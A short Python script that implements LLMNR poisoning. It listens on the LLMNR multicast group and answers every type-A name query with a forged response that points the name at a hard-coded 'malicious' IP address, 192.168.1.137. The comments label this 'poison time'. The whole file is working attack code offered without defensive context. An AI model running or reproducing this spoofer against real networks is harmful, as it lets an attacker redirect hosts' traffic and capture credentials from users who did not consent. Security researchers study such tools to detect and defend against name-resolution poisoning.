import socket
import struct
import binascii

MCAST_GRP = '224.0.0.252'
MCAST_PORT = 5355

malip = '192.168.1.137'
port = 5355

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# bind to multicast ip and port
sock.bind((MCAST_GRP, MCAST_PORT))
# notify that we are listening
mreq = struct.pack("4sl", socket.inet_aton(MCAST_GRP), socket.INADDR_ANY)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)



# trusty packet construct
def pakit(transid, rname, respip):
	msg = transid                 # msg transact ID
	msg += '\x80\00'              # quary response
	msg += '\x00\x01'             # questions = 16
	msg += '\x00\x01'             # anser RRs = 16
	msg += '\x00\x00'
	msg += '\x00\x00'
	msg += struct.pack(">h",len(rname))[1]
	msg += rname
	msg += '\x00'                 # null?
	msg += '\x00\x01'             # type
	msg += '\x00\x01'             # class
	msg += struct.pack(">h",len(rname))[1] # has to have this
	msg += rname
	msg += '\x00'                 # null?
	msg += '\x00\x01'             # Type
	msg += '\x00\x01'             # class # 01 = IN
	msg += '\x00\x00\x00\x1e'     # poison time 30sec
	msg += '\x00\x04'             # IP len ???
	msg += socket.inet_aton(respip)
	return msg


# parse the sequence num, name, and quary type A or AAAA
def parse_llmnr(data):
  NameLen = struct.unpack('>B',data[12])[0]
  Name = data[13:13+NameLen]
  Tid=data[0:2]
  Typ=data[len(data)-4:len(data)-2]
  return Name, Tid, Typ


while True:
  pkt, ip = sock.recvfrom(1024)
  if pkt != '':
    # parse the name and transact ID
    nam, tid, typ = parse_llmnr(pkt)
    # only respond to type A
    if typ == '\x00\x01':
      # package it up for the response
      msg = pakit(tid, nam, malip)
      # Send the reply from our bound socket to incoming ip and port
      sock.sendto(msg, (ip[0], ip[1]))
      # print the hex of everything
      print binascii.hexlify(tid), nam, binascii.hexlify(pkt)
